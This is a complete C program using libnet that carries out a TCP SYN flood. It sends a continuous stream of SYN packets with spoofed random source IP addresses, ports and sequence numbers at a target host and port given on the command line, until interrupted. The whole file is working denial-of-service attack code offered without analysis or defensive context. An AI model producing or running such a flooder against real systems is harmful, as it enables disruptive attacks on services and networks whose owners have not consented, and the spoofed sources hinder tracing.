#include <libnet.h>
#include <stdbool.h>
#include <signal.h>
#include <stdlib.h>

#define FLOOD_DELAY 5000

bool _loop = true;

void sigint_handler(int signum) {
    _loop = false;
}

/* Returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr) {
    return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
}

void libnet_fatal(const char *failed_in, const char *errbuf) {
    printf("Fatal error in %s: %s\n", failed_in, errbuf);
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
    u_long dest_ip;
    u_short dest_port;
    char errbuf[LIBNET_ERRBUF_SIZE];
    int network, byte_count;
    int packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;
    libnet_t *libnet_cxt;


    signal(SIGINT, sigint_handler);

    if (argc != 3) {
        printf("Usage:\t%s <target host> <target port>\n", argv[0]);
        return EXIT_SUCCESS;
    }

    libnet_cxt = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (libnet_cxt == NULL) {
        libnet_fatal("libnet_init", errbuf);
    }

    dest_ip = libnet_name2addr4(libnet_cxt, argv[1], LIBNET_RESOLVE);
    dest_port = (u_short) atoi(argv[2]);

    network = libnet_open_raw4(libnet_cxt);
    if (network == -1) {
        libnet_fatal("libnet_open_raw4", libnet_geterror(libnet_cxt));
    }

    libnet_seed_prand(libnet_cxt);

    printf("SYN flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
    while (_loop) {
        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),    // Source TCP port
                         dest_port,                         // Dest TCP port
                         libnet_get_prand(LIBNET_PRu32),    // Seq num
                         libnet_get_prand(LIBNET_PRu32),    // ACK num
                         TH_SYN,                            // Control flags (SYN)
                         libnet_get_prand(LIBNET_PRu16),    // TCP Window
                         0,                                 // TCP checksum
                         0,                                 // Urgent Ptr
                         20,                                // TCP Len
                         NULL,                              // Payload
                         0,                                 // Payload len
                         libnet_cxt,                        // Libnet context
                         0);                                // Protocol tag

        libnet_build_ipv4(LIBNET_IPV4_H,                    //Size of the packet sans IP HEADER
                          IPTOS_LOWDELAY,                   // IP TOS
                          libnet_get_prand(LIBNET_PRu16),   // IP ID
                          0,                                // Frag Offset
                          libnet_get_prand(LIBNET_PR8),     // TTL
                          IPPROTO_TCP,                      // Transport protocol
                          0,                                // IP checksum
                          libnet_get_prand(LIBNET_PRu32),   // Source IP
                          dest_ip,                          // Dest IP
                          NULL,                             // Payload
                          0,                                // Payload size
                          libnet_cxt,                       // Libnet context
                          0);                               // Protocol tag value

        packet_size = libnet_getpacket_size(libnet_cxt);
        byte_count = libnet_write(libnet_cxt);
        if (byte_count != packet_size) {
            printf("%d of %d bytes sent.\n", byte_count, packet_size);
            libnet_fatal("libnet_write", libnet_geterror(libnet_cxt));
        }

        libnet_clear_packet(libnet_cxt);
        usleep(FLOOD_DELAY);
    }

    printf("Ending program.\n");

    if (libnet_close_raw4(libnet_cxt) == -1) {
        libnet_fatal("libnet_close_raw4", "Failed to close socket.\n");
    }
    libnet_destroy(libnet_cxt);

    return EXIT_SUCCESS;
}